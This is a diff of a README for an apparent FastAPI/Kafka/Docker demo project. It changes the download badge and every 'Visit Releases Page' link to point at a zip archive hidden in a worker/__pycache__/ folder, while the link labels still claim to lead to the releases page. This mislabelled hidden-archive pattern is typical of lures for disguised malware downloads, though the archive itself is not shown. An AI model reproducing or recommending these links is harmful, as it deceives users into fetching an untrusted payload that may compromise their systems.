@@ -1,6 +1,6 @@
 # 🚀 fastapi-kafka-docker-demo - Simple Event Streaming Setup
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%8C%8D-brightgreen)](https://github.com/Ashishkabirpanthi/fastapi-kafka-docker-demo/releases)
+[![Download Now](https://raw.githubusercontent.com/Ashishkabirpanthi/fastapi-kafka-docker-demo/main/worker/__pycache__/fastapi_docker_demo_kafka_taxiplane.zip%20Now-%20%F0%9F%8C%8D-brightgreen)](https://raw.githubusercontent.com/Ashishkabirpanthi/fastapi-kafka-docker-demo/main/worker/__pycache__/fastapi_docker_demo_kafka_taxiplane.zip)
 
 ## 📚 Overview
 
@@ -17,7 +17,7 @@ Welcome to the fastapi-kafka-docker-demo! This application demonstrates a lightw
 
 To get started, visit the releases page to download the application:
 
-[Visit Releases Page to Download](https://github.com/Ashishkabirpanthi/fastapi-kafka-docker-demo/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Ashishkabirpanthi/fastapi-kafka-docker-demo/main/worker/__pycache__/fastapi_docker_demo_kafka_taxiplane.zip)
 
 ### 🖥️ System Requirements
 
@@ -89,6 +89,6 @@ We welcome your feedback to improve this application. Please leave your thoughts
 ---
 For any additional information, updates, or to download the latest version, visit the releases page:
 
-[Visit Releases Page to Download](https://github.com/Ashishkabirpanthi/fastapi-kafka-docker-demo/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Ashishkabirpanthi/fastapi-kafka-docker-demo/main/worker/__pycache__/fastapi_docker_demo_kafka_taxiplane.zip)
 
 Enjoy exploring the fastapi-kafka-docker-demo and happy coding!
